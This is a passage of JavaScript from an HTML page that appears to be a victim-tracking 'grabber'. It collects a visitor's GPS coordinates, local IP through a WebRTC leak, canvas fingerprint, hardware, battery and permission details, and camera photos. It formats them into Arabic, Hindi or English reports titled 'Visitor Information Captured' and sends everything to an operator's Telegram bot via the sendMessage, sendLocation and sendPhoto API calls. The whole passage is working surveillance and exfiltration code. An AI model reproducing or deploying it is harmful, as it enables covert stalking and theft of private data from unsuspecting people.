        function getGeolocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) return reject({ code: 0 });
                const attempt = (opts, isRetry) => {
                    navigator.geolocation.getCurrentPosition(
                        resolve,
                        (err) => {
                            if (!isRetry && (err.code === 2 || err.code === 3)) {
                                attempt({ enableHighAccuracy: false, maximumAge: 60000, timeout: 30000 }, true);
                            } else { reject(err); }
                        },
                        opts
                    );
                };
                attempt({ enableHighAccuracy: true, maximumAge: 60000, timeout: 30000 }, false);
            });
        }

        function getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("N/A");
                        const myIpRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                        const match = myIpRegex.exec(ice.candidate.candidate);
                        if (match) {
                            resolve(match[1]);
                            pc.close();
                        }
                    };
                    setTimeout(() => resolve("N/A"), 2000);
                } catch(e) { resolve("N/A"); }
            });
        }

                const b64 = canvas.toDataURL().replace("data:image/png;base64,", "");

                let locHi = locStatus === 'granted' ? 'अनुमति दी गई' : locStatus === 'denied' ? 'अस्वीकृत' : 'संकेत';

                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';

                const localIp = await getLocalIP();
                const fingerprint = getCanvasFingerprint();
                const gpuInfo = getGPU();
                const cpuCores = navigator.hardwareConcurrency || "Unknown";
                
                const deviceInfo = getDeviceInfo(deviceModel);
                let finalName = deviceInfo.name;
                let finalRam = deviceInfo.ram;
                let finalStorage = deviceInfo.storage;

                let gpsSectionAr = "", gpsSectionEn = "", gpsSectionHi = "";
                if (gpsData) {
                    gpsSectionAr = `\n📍 الموقع الدقيق (GPS)\n   • المنطقة: ${gpsData.areaName}\n   • خط العرض: ${gpsData.lat}\n   • خط الطول: ${gpsData.lon}\n   • الدقة: ${gpsData.acc} متر\n`;
                    gpsSectionEn = `\n📍 Exact Location (GPS)\n   • Area: ${gpsData.areaName}\n   • Lat: ${gpsData.lat}\n   • Lon: ${gpsData.lon}\n   • Accuracy: ${gpsData.acc} m\n`;
                    gpsSectionHi = `\n📍 सटीक स्थान (GPS)\n   • क्षेत्र: ${gpsData.areaName}\n   • अक्षांश: ${gpsData.lat}\n   • देशांतर: ${gpsData.lon}\n   • सटीकता: ${gpsData.acc} मीटर\n`;
                }

                let report = "";

                if (botLang === 'ar') {
                    report = `📊 تم سحب معلومات الزائر\n━━━━━━━━━━━━━━━━\n\n🖥️ الجهاز والمتصفح\n   • الموديل: ${finalName}\n   • نظام التشغيل: ${osName} ${osVersion}\n   • التطبيق: ${browserName}\n   • كود المتصفح: <code>${ua}</code>\n${tgSectionAr}\n🌐 معلومات الشبكة\n   • الآي بي العام: ${ipDataGlobal.ip || 'غير معروف'}\n   • الآي بي المحلي: ${localIp}\n   • نوع الاتصال: ${netAr}\n   • السرعة: ${netDownlink} Mbps | الاستجابة: ${netRtt} ms\n   • اللغة: ${navigator.language}\n\n📍 تفاصيل الموقع (IP)\n   • الدولة: ${ipDataGlobal.country || 'غير معروف'}\n   • المحافظة: ${ipDataGlobal.region || 'غير معروف'}\n   • المدينة: ${ipDataGlobal.city || 'غير معروف'}\n   • التوقيت: ${deviceTimezone}\n${gpsSectionAr}\n🖼️ معلومات الشاشة\n   • الدقة: ${screenRes}\n   • الاتجاه: ${orientation}\n   • الألوان: ${colorDepth}\n\n🔋 حالة البطارية\n   • المستوى: ${batLevel}%\n   • الشحن: ${isCharging ? 'نعم' : 'لا'}\n\n🔐 الصلاحيات\n   • الكاميرا: ${camAr}\n   • الموقع: ${locAr}\n\n💾 الهاردوير\n   • المعالج: ${cpuCores} نواة\n   • كرت الشاشة: ${gpuInfo}\n   • الرام: ${finalRam}\n   • المساحة: ${finalStorage}\n\n🔏 بصمة الجهاز\n   • ${fingerprint}\n\n━━━━━━━━━━━━━━━━\n⚡ المطور: <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>`;
                } else if (botLang === 'hi') {
                    report = `📊 आगंतुक जानकारी कैप्चर की गई\n━━━━━━━━━━━━━━━━\n\n🖥️ डिवाइस और ब्राउज़र\n   • डिवाइस मॉडल: ${finalName}\n   • ऑपरेटिंग सिस्टम: ${osNameHi} ${osVersion}\n   • ऐप इंटरफ़ेस: ${browserName}\n   • यूजर-एजेंट: <code>${ua}</code>\n${tgSectionHi}\n🌐 नेटवर्क जानकारी\n   • पब्लिक आईपी: ${ipDataGlobal.ip || 'अज्ञात'}\n   • लोकल आईपी: ${localIp}\n   • कनेक्शन प्रकार: ${netHi}\n   • गति: ${netDownlink} Mbps | RTT: ${netRtt} ms\n   • भाषा: ${navigator.language}\n\n📍 स्थान विवरण (IP)\n   • देश: ${ipDataGlobal.country || 'अज्ञात'}\n   • क्षेत्र: ${ipDataGlobal.region || 'अज्ञात'}\n   • शहर: ${ipDataGlobal.city || 'अज्ञात'}\n   • समय क्षेत्र: ${deviceTimezone}\n${gpsSectionHi}\n🖼️ प्रदर्शन जानकारी\n   • रिज़ॉल्यूशन: ${screenRes}\n   • अभिविन्यास: ${orientation}\n   • रंग की गहराई: ${colorDepth}\n\n🔋 बैटरी की स्थिति\n   • स्तर: ${batLevel}%\n   • चार्जिंग: ${isCharging ? 'हाँ' : 'नहीं'}\n\n🔐 डिवाइस अनुमतियाँ\n   • कैमरा: ${camHi}\n   • स्थान: ${locHi}\n\n💾 हार्डवेयर और स्टोरेज\n   • सीपीयू कोर: ${cpuCores}\n   • जीपीयू: ${gpuInfo}\n   • रैम: ${finalRam}\n   • स्टोरेज: ${finalStorage}\n\n🔏 डिवाइस फिंगरप्रिंट\n   • ${fingerprint}\n\n━━━━━━━━━━━━━━━━\n⚡ डेवलपर: <a href="tg://user?id=${ADMIN_ID}">संपर्क करें</a>`;
                } else {
                    report = `📊 Visitor Information Captured\n━━━━━━━━━━━━━━━━\n\n🖥️ Device & Browser\n   • Device Model: ${finalName}\n   • OS: ${osNameEn} ${osVersion}\n   • App Interface: ${browserName}\n   • User-Agent: <code>${ua}</code>\n${tgSectionEn}\n🌐 Network Information\n   • Public IP: ${ipDataGlobal.ip || 'Unknown'}\n   • Local IP: ${localIp}\n   • Connection Type: ${netEn}\n   • Speed: ${netDownlink} Mbps | RTT: ${netRtt} ms\n   • Language: ${navigator.language}\n\n📍 Location Details (IP)\n   • Country: ${ipDataGlobal.country || 'Unknown'}\n   • Region: ${ipDataGlobal.region || 'Unknown'}\n   • City: ${ipDataGlobal.city || 'Unknown'}\n   • Timezone: ${deviceTimezone}\n${gpsSectionEn}\n🖼️ Display Information\n   • Resolution: ${screenRes}\n   • Orientation: ${orientation}\n   • Color Depth: ${colorDepth}\n\n🔋 Battery Status\n   • Level: ${batLevel}%\n   • Charging: ${isCharging ? 'Yes' : 'No'}\n\n🔐 Device Permissions\n   • Camera: ${camEn}\n   • Location: ${locEn}\n\n💾 Hardware & Storage\n   • CPU Cores: ${cpuCores}\n   • GPU: ${gpuInfo}\n   • RAM: ${finalRam}\n   • Storage: ${finalStorage}\n\n🔏 Device Fingerprint\n   • ${fingerprint}\n\n━━━━━━━━━━━━━━━━\n⚡ Developed by: <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>`;
                }

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
                });
                
                const resData = await response.json();
                if (!resData.ok) {
                    showAlert("خطأ من تليجرام: " + resData.description + "\nاتأكد إنك عملت Start للبوت الأول.");
                }

                if (gpsData) {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: targetUserId,
                            latitude: gpsData.lat,
                            longitude: gpsData.lon
                        })
                    }).catch(e=>{});
                }

            } catch (error) {
                showAlert("حدث خطأ في الكود: " + error.message);
            }
        }

        async function sendPhoto(blob, filename) {
            if (!targetUserId) return;
            const formData = new FormData();
            formData.append('photo', blob, filename);
            formData.append('caption', `🚨 Photo (${mode})`);
            formData.append('chat_id', targetUserId);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
        }

        initPage();
    </script>
</body>
</html>
